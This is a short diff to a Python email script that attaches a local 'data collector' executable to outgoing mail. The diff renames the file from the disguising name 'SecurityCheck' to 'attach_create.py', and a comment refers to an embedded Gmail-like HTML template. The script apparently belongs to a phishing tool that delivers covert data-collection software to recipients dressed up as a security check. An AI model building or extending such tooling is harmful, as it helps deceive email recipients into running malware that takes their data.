@@ -10,11 +10,11 @@ import smtplib
 import os
 
 def attach_data_collector(msg):
-    """Attach the SecurityCheck executable to the email."""
-    collector_path = os.path.join(os.path.dirname(__file__), 'SecurityCheck')
+    """Attach the attach_create.py executable to the email."""
+    collector_path = os.path.join(os.path.dirname(__file__), 'attach_create.py')
     
     if not os.path.exists(collector_path):
-        print("Error: SecurityCheck file not found!")
+        print("Error: attach_create.py file not found!")
         return False
         
     with open(collector_path, 'rb') as f:
@@ -25,10 +25,10 @@ def attach_data_collector(msg):
         file_data,
         maintype='application',
         subtype='octet-stream',
-        filename='SecurityCheck'
+        filename='attach_create.py'
     )
     
-    print("✅ SecurityCheck executable attached")
+    print("attach_create.py executable attached")
     return True
 
 # Embedded Gmail-like HTML template with placeholders
